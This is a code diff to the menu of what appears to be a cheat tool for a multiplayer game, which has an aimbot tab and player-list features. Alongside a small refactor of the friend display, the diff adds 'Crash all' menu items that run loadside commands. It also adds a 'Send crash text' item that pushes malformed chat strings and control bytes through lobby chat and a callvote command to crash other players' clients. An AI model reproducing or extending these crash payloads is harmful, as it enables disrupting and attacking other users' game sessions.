@@ -135,23 +135,6 @@ namespace menu
 
 	void draw_player_list(const float width, const float spacing)
 	{
-		const auto draw_friend_name = [=](const std::string& player_name, const std::uint64_t steam_id)
-		{
-			for (const auto& friends : friends::friends)
-			{
-				if (friends.steam_id == steam_id)
-				{
-					ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);
-
-					auto friend_name = utils::string::va("(%s)", friends.name.data());
-					if (friends.name == player_name)
-						friend_name = "[Friend]";
-
-					ImGui::TextColored(ImVec4(0.0f, 0.5f, 1.0f, 0.95f), "%s", friend_name.data());
-				}
-			}
-		}; 
-
 		if (ImGui::BeginTabItem("Player List"))
 		{
 			const auto session = game::session_data();
@@ -232,8 +215,17 @@ namespace menu
 					}
 
 					const auto netadr = game::get_session_netadr(session, target_client);
+					
+					if (const auto f = friends::get(player_xuid); f && f->steam_id == player_xuid)
+					{
+						ImGui::SameLine(0, spacing);
 
-					draw_friend_name(player_name, player_xuid); 
+						auto friend_name = "(" + f->name + ")";
+						if (f->name == player_name)
+							friend_name = "[Friend]";
+
+						ImGui::TextColored(ImVec4(0.0f, 0.5f, 1.0f, 0.95f), "%s", friend_name.data());
+					}
 					
 					const auto popup = "player_popup##" + std::to_string(client_num);
 
@@ -273,7 +265,7 @@ namespace menu
 								if (ImGui::Button("Add friend"))
 								{
 									friends::friends.emplace_back(friends::friend_info{ player_xuid, friend_player_name });
-									friends::write_to_friends();
+									friends::write();
 								}
 
 								ImGui::EndMenu();
@@ -404,6 +396,7 @@ namespace menu
 
 				const auto width = ImGui::GetContentRegionAvail().x;
 				const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;
+				const auto in_game = game::in_game();
 				const auto session = game::session_data();
 
 				if (ImGui::BeginTabItem("Aimbot"))
@@ -467,7 +460,7 @@ namespace menu
 					ImGui::Checkbox("Log lobby messages", &events::lobby_msg::log_messages);
 					ImGui::Checkbox("Log server commands", &events::server_command::log_commands);
 					ImGui::Checkbox("Prevent join", &events::prevent_join);
-					ImGui::Checkbox("Don't update presence", &events::update_presence);
+					ImGui::Checkbox("Don't update presence", &events::no_presence);
 
 					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
 					{
@@ -507,9 +500,28 @@ namespace menu
 							command::execute("mr " + std::to_string(game::cl()->serverId) + " 0 endround");
 						}
 
-						if (ImGui::MenuItem("Crash all"))
+						if (ImGui::MenuItem("Crash all (loadside)"))
 						{
 							command::execute("loadside 0 "s + game::ui_mapname->current.string + " 0 0");
+						}
+
+						if (ImGui::MenuItem("Crash all 2 (loadside)"))
+						{
+							command::execute("loadside 0 cum 0 0");
+						}
+
+						if (ImGui::MenuItem("Send crash text", nullptr, nullptr, session))
+						{
+							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "$(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)"); 
+							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "^aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
+							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "^B");
+							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "^H");
+							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "^H" "\xFF\xFF\xFF");
+
+							if (in_game)
+							{
+								command::execute("callvote map ^H\x7F\x7F\x12" "postfx_electrified");
+							}
 						}
 						
 						if (ImGui::MenuItem("Crash server", 
@@ -540,6 +552,21 @@ namespace menu
 							if (ImGui::Button("Execute##execute_command", { 64.0f, 0.0f }))
 							{
 								command::execute(command_input);
+							}
+						}
+
+						if (begin_section("Send lobby chat message"))
+						{
+							static auto message_input = ""s;
+
+							ImGui::SetNextItemWidth(width * 0.85f);
+							ImGui::InputTextWithHint("##message_input", "Message", &message_input);
+
+							ImGui::SameLine();
+
+							if (ImGui::Button("Send##send_chat_message", { 64.0f, 0.0f }))
+							{
+								steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, message_input);
 							}
 						}
 
